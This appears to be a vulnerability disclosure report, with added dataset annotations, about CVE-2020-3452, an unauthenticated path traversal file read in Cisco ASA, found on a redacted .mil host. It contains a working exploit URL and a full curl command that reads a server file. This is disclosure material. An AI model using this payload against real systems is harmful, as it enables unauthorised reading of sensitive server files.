title: [CVE-2020-3452] Unauthenticated file read in Cisco ASA
content:
Hey,
I found out that host ████████.mil was vulnerable to CVE-2020-3452.
You can test it by visiting the URL:
Code 133 Bytes
1https://██████████.mil/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
To try it with CURL please run the following command:
Code 693 Bytes
1curl -i -s -k  -X $'GET' \
2    -H $'Host: ███████.mil' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Dest: document' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \
3    $'https://████████.mil/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua'
███████
Reference:
https://www.secpod.com/blog/cve-2020-3452-affecting-85000-cisco-asa-ftd-devices/
https://twitter.com/aboul3la/status/1286012324722155525
Impact
Anyone can read any file present on the server.
steps: Alternatively, use the provided curl command to send a GET request to the same URL with specific headers.
vuln_description: This vulnerability allows unauthenticated users to read any file on the server due to a path traversal flaw in Cisco ASA's web interface. The issue is triggered by manipulating the 'name' parameter in the URL to traverse directories and access sensitive files.
reason: The vulnerability is straightforward to exploit as it only requires crafting a specific URL or curl command. There are no complex interactions or state manipulations involved, and the attack vector is well-documented and similar to other path traversal vulnerabilities.
